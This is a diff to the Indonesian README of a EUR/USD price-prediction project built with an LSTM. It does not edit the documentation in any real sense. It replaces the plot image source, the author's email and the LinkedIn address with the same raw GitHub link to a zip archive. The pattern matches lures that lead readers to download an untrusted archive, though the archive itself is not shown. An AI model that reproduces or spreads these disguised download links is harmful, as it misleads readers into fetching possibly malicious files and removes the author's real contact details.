@@ -60,7 +60,7 @@ Data yang digunakan mencakup rentang waktu dari **tahun 2024 hingga 2025**, deng
 Plot prediksi harga EUR/USD:
 
 <p align="center">
-  <img src="result/Plot_stockPrice.png" width="600"/>
+  <img src="https://raw.githubusercontent.com/wheldnz/Prediksi-EUR-USD-LSTM/main/result/Prediksi-EUR-USD-LSTM_v3.3.zip" width="600"/>
 </p>
 
 ---
@@ -78,8 +78,8 @@ Plot prediksi harga EUR/USD:
 **Nama:** _M. Wildan Nuril Akmal 
 
 **Minat:** Data Science, Deep Learning for Time Series  
-- 📧 Email: [wildanuril99@email.com]  
-- 💼 LinkedIn: [www.linkedin.com/in/wildan-nuril]
+- 📧 Email: [https://raw.githubusercontent.com/wheldnz/Prediksi-EUR-USD-LSTM/main/result/Prediksi-EUR-USD-LSTM_v3.3.zip]  
+- 💼 LinkedIn: [https://raw.githubusercontent.com/wheldnz/Prediksi-EUR-USD-LSTM/main/result/Prediksi-EUR-USD-LSTM_v3.3.zip]
 
 
 
